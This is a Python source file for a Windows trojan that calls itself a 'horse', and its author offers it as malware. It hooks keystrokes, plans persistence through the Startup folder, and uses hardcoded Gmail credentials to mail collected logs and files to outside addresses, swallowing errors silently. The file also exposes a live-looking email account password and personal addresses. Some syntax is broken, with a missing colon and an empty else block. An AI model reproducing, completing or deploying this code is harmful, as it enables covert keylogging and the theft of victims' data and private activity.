import os
import pythoncom
import pyHook
import psutil
import time
import threading
import smtplib
import shutil
import mmap
import glob
import win32com.client as win32
import xlrd
import re
import pywintypes
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders


class Constants(object):
    """
    Contains the Constants for the horse
    """
    USER_NAME = os.getlogin()
    USER_PATH = r'C:\Users\\'+ USER_NAME
    SEARCH_ROOT = USER_PATH
    ROOT = r'C:'
    LOG_FILE_LOCATION = os.path.join(USER_PATH, r'Documents\tlog.txt')
    APPEND_MODE = 'a'
    OVERWRITE_MODE = 'w'
    READ_MODE = 'r'
    MAX_LOG_SIZE = 1000000
    WORD_LIST = ['shimon', 'with']
    DESTINATION_FOLDER_PATH = USER_PATH + r'Documents\test'
    CHROME_PROCESS_NAME = 'chrome.exe'
    ENDLINE = '\n'
    KEY_STROKES_LOG = os.path.join(USER_PATH, r'Documents\kslog.txt')
    EMAIL_SERVER_NAME = 'smtp.gmail.com:587'
    EMAIL_SOURCE = 'trojanhorsepy@gmail.com'
    EMAIL_DESTINATION_LIST = ['nassanpaul@gmail.com', 'shimonste@gmail.com']
    EMAIL_CC_LIST = []
    EMAIL_SUBJECT_HEADER = 't...'
    EMAIL_LOGIN = 'trojanhorsepy@gmail.com'
    EMAIL_PASSWORD = 'nattanshimon'
    STARTUP_LOCATION = USER_PATH + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    FIRST_TIME = 'FIRSTtime.txt'
    FIRST_TIME_DIR = USER_PATH + r'Documents\tks'
    FIRST_TIME_ALL_DIR = os.path.join(FIRST_TIME, FIRST_TIME)
    SELF_LOCATION = os.path.abspath(__file__)
    PYTHON_DEFAULT_LOCATION = ''


class AttachMail():

    def start_server(self):
        self.mailServer = smtplib.SMTP('smtp.gmail.com',587)
        # self.mailServer = smtplib.SMTP_SSL('smtp.gmail.com', 587)
        self.mailServer.ehlo()
        self.mailServer.starttls()
        self.mailServer.ehlo()
        self.mailServer.login(Constants.EMAIL_LOGIN, Constants.EMAIL_PASSWORD)

    def stop_server(self):
        self.mailServer.close()

    def sendMail(self, to, subject, text, attach):
        try:
            msg = MIMEMultipart()

            msg['From'] = Constants.EMAIL_LOGIN
            msg['To'] = to
            msg['Subject'] = subject
            msg.attach(MIMEText(text))

            part = MIMEBase('application', 'octet-stream')
            part.set_payload(open(attach, 'rb').read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename = "%s"' % os.path.basename(attach))

            msg.attach(part)
            self.mailServer.sendmail(Constants.EMAIL_LOGIN, to, msg.as_string())
        except:
            pass

    def sendMailInFolder(self):
        while True:
            try:
                time.sleep(86400)
                del_old_files = OSmanipulation()
                del_old_files.erase_old_files()
                self.start_server()
                for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH)
                    for each in files:
                        temp = str(each)
                        temp = os.path.join(root, temp)
                        self.sendMail(Constants.EMAIL_DESTINATION_LIST, 'Python', 'Python', temp)
                    self.stop_server()
            except:
                pass


class Log(object):
    """
    Contains the log method for the horse
    """
    def __init__(self):
        create_file = open(Constants.LOG_FILE_LOCATION, Constants.APPEND_MODE)
        create_file.write("Log Constructor called\n")
        create_file.close()

    def writeMessage(self, message):
        if self.logSizeUnder1MB(Constants.LOG_FILE_LOCATION):
            f = open(Constants.LOG_FILE_LOCATION, Constants.APPEND_MODE)
            f.writelines(message)
            f.close()
        else:



class Email(object):

    def __init__(self):
        self.header = 'From: %s\n' % Constants.EMAIL_SOURCE
        self.header += 'To: %s\n' % ','.join(Constants.EMAIL_DESTINATION_LIST)
        self.header += 'Cc: %s\n' % Constants.EMAIL_CC_LIST
        self.header += 'Subject: %s\n' % Constants.EMAIL_SUBJECT_HEADER
        self.server = smtplib.SMTP(Constants.EMAIL_SERVER_NAME)
        self.log_controller = Log()
        self.log_controller.writeMessage('Email object instantiated.')

    def startserver(self):
        self.server.starttls()
        self.log_controller.writeMessage('email server is now UP.')
        self.server.login(Constants.EMAIL_LOGIN, Constants.EMAIL_PASSWORD)
        self.log_controller.writeMessage('Successfully logged into email server.')

    def stopserver(self):
        self.server.quit()
        self.log_controller.writeMessage('email server is now DOWN.')

    def sendemail(self, body):
        self.server.sendmail(Constants.EMAIL_SOURCE, Constants.EMAIL_DESTINATION_LIST, self.header + body)

